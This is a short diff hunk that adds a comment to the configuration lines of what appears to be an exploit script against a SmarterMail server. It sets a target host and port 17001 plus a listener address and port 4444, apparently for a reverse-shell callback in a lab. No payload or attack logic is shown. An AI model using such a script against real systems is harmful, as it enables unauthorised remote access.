@@ -19,6 +19,7 @@ import socket
 from struct import pack
 
 HOST = "192.168.213.65"
+# SmaterMail endpoint port
 PORT = 17001
 LHOST = "192.168.45.194"
 LPORT = 4444
